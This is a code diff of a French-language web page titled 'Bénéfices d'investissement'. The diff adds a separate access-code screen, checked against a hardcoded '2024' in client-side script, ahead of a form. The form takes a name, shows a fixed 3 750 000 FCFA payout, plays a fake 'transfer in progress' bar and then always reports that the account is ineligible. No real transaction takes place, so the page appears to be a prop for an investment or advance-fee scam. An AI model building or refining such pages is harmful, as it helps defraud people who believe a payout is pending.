@@ -14,7 +14,7 @@
             height: 100vh;
         }
 
-        .container {
+        .container, .form-container {
             background-color: #fff;
             padding: 30px;
             border-radius: 10px;
@@ -96,6 +96,14 @@
             font-weight: bold;
         }
 
+        .access-error {
+            color: red;
+            font-size: 14px;
+            display: none;
+            margin-top: 10px;
+            font-weight: bold;
+        }
+
         button {
             background-color: #007bff;
             color: white;
@@ -114,15 +122,20 @@
     </style>
 </head>
 <body>
-    <div class="container">
+    <div class="container" id="accessContainer">
+        <h1>Vérification du Code d'Accès</h1>
+        <div class="form-group">
+            <label for="accessCode">Entrez le Code d'accès</label>
+            <input type="password" id="accessCode" placeholder="Code d'accès" required>
+        </div>
+        <button onclick="checkAccessCode()">Valider</button>
+        <div class="access-error" id="accessError">Erreur : Code d'accès incorrect.</div>
+    </div>
+
+    <div class="form-container" id="formContainer" style="display: none;">
         <h1>Bénéfices d'investissement</h1>
 
         <form id="tmoneyForm" onsubmit="return false;">
-            <div class="form-group">
-                <label for="accessCode">Code d'accès</label>
-                <input type="password" id="accessCode" placeholder="Code d'accès" required>
-            </div>
-
             <div class="form-group">
                 <label for="name">Nom et Prénom</label>
                 <input type="text" id="name" placeholder="Nom et Prénom" required>
@@ -138,7 +151,7 @@
                 <input type="text" id="amount" class="amount" value="3 750 000 FCFA" disabled>
             </div>
 
-            <button type="button" onclick="validateAccessCode()">Procéder</button>
+            <button type="button" onclick="startProgress()">Procéder</button>
 
             <div class="progress-title" id="progressTitle">Transfert des fonds en cours...</div>
 
@@ -148,18 +161,18 @@
             </div>
 
             <div class="notification-message" id="notificationMessage">Erreur : Le compte n'est pas éligible pour recevoir la somme de 3 750 000 FCFA.</div>
-            <div class="notification-message" id="accessError" style="color: red; display: none;">Erreur : Code d'accès incorrect.</div>
         </form>
     </div>
 
     <script>
-        function validateAccessCode() {
+        function checkAccessCode() {
             const accessCode = document.getElementById('accessCode').value;
             const accessError = document.getElementById('accessError');
 
             if (accessCode === "2024") {
                 accessError.style.display = 'none';
-                startProgress();
+                document.getElementById('accessContainer').style.display = 'none';
+                document.getElementById('formContainer').style.display = 'block';
             } else {
                 accessError.style.display = 'block';
             }
